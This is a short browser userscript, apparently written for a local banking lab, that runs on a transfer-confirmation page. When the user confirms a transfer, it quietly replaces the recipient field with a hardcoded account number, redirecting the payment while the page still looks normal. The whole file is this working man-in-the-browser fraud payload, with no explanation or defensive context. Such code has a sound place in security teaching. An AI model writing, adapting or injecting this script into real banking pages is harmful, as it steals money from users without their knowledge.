// ==UserScript==
// @name         change account
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://localhost/confirm_transfer.php*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    var myaccount = "36714975901497522709438689";
    var actions = document.getElementsByTagName("button");
    var form = document.getElementsByTagName("form")[0];
    var action = null;

    form.onsubmit = function(ev){
        if(action == null){
            action = actions[0];
        }

        if(action.getAttribute("formaction") == "transfer_confirmed.php"){
            document.getElementsByName("to")[0].setAttribute("value", myaccount);
        }

        return true;
    };

    for(var i=0; i < actions.length; ++i){
        actions[i].onclick = function(ev){
            action = this;
        };
    }
})();
